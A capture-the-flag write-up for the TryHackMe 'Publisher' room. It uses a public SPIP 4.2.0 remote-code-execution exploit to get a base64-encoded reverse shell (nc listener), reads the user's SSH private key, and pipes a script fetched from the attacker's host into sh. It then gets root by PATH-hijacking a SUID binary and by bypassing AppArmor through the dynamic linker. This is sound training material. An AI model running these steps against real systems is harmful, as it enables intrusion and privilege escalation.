# Publisher

A writeup for the room [Publisher](https://tryhackme.com/r/room/publisher) on TryHackMe.

> Test your enumeration skills on this boot-to-root machine.

<Image src={require("./logo.webp").default} height="256" />

## What is the user flag?

### Nmap scan

We can start by scanning the target with Nmap:

```sh
nmap -sS TARGET_IP
```

The scan reveals two open ports: 22 (SSH) and 80 (HTTP).

<Image src={require("./1-1-nmap.webp").default} />

### Web server enumeration

We can start by visiting the web server at `http://TARGET_IP`. The page is a simple blog with a few posts.

There isn't much to see here and most of the links are dead.

However, we can notice that in many places there are references to `SPIP`, which is a content management system (CMS).

<Image src={require("./1-2-home.webp").default} />

We can use `gobuster` to enumerate the web server for hidden directories.

```sh
gobuster dir -u http://TARGET_IP -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

The scan reveals a few interesting directories, including `/images` and `/spip`.

<Image src={require("./1-3-gobuster.webp").default} />

<Image src={require("./1-4-images.webp").default} />

<Image src={require("./1-5-spip.webp").default} />

### Searching for the SPIP version

Even with the previous enumeration, we didn't find anything interesting.

However, now we are sure that the website is running SPIP and there might be a vulnerability in the version used.

There are multiple ways to find the version of SPIP of the website.
A direct approach is to look at the source code of the page, which reveals the version `4.2.0` inside a meta tag.

<Image src={require("./1-6-source.webp").default} />

### Exploiting vulnerabilities in SPIP 4.2.0

We can search for vulnerabilities in SPIP 4.2.0 on the internet.

The exploit 51536 seems to be a good candidate for this version allowing remote code execution.

[https://www.exploit-db.com/exploits/51536](https://www.exploit-db.com/exploits/51536)

We can download the exploit and run it with the target IP. To avoid issues with special characters, we can use a base64 encoded command.

```bash
# Testing the exploit
python3 exploit.py -u http://TARGET_IP/spip -c "sleep 5"

# Running the lister in another terminal
nc -lvnp 1337

# Running a rev shell by encoding the command in base64
REV_SHELL=$(echo "" | base64)
echo $REV_SHELL
python3 exploit.py -u http://TARGET_IP/spip -c "echo $REV_SHELL | base64 -d | bash"
```

<Image src={require("./1-7-exploit-test.webp").default} />

<Image src={require("./1-8-exploit.webp").default} />

### Getting the first flag

Once inside the server, we can navigate to the home directory of the user `thing` where we can find the ssh credentials and the user flag.

```sh
cat /home/thing/user.txt
cat /home/thing/.ssh/id_rsa
ssh thing@TARGET_IP
```

<Image src={require("./1-9-revshell.webp").default} />

## What is the root flag?

### Analyzing with LinPEAS

Now that we are inside the server, we can run LinPEAS to find potential privilege escalation vectors.

Be careful, there is no external connection from the server and most of the folder are not writable.

A simple solution is to transfer the script to the server using a webserver and then run it directly on the target.

```sh
# On your machine
python3 -m http.server 8000

# On the target machine
curl http://YOUR_IP:8000/linpeas.sh | sh | less -R
```

We can notice that there is a binary run_container with SUID set and that also AppArmor is enabled.

Looking to our current session, we can see that we are in a container and we are not running bash but ash.

This is a shell with limited functionalities based on the AppArmor profile.

<Image src={require("./2-1-suid.webp").default} />

### Method 1: Exploiting the AppArmor profile

We can try to look at the AppArmor profile to see if there are any restrictions that we can exploit.

<Image src={require("./2-2-apparmor-profile.webp").default} />

Even if we don't have read permission on /opt/, we can still read internal files like /opt/run_container.sh.

Also, there is no rule that prevents us from writing to /var/tmp, so we can use this folder to write new files.

The script is based on docker, so if we change the PATH we can set up a new docker script to run a reverse shell.

The new run_container.sh will then run this custom docker binary which will allow us to get a root shell and then the last flag.

```sh
cd /var/tmp
touch docker
echo "/bin/bash -p" > docker
chmod +x docker
PATH=/var/tmp:$PATH run_container
```

<Image src={require("./2-3-apparmor-exploit.webp").default} />

### Method 2: Exploiting the SUID binary directly

Since run_container.sh is writable by us, we can modify it to run a reverse shell.

However, we need to escape the AppArmor profile by running a bash shell directly.

One possible solution is to run the `ldd` command to find the dynamic linker used by the binary.
Then, by calling the same linker directly, we can run bash externally and modify the script by adding the command to read the root flag.

```sh
ldd /opt/run_container
/lib64/ld-linux-x86-64.so.2 /bin/bash -c 'echo "cat /root/root.txt" >> /opt/run_container.sh'
run_container
```

<Image src={require("./2-4-bash-append-1.webp").default} />

<Image src={require("./2-5-bash-append-2.webp").default} />

Once done, we simply have to run the binary and get the root flag.

<Image src={require("./2-6-bash-exploit.webp").default} />
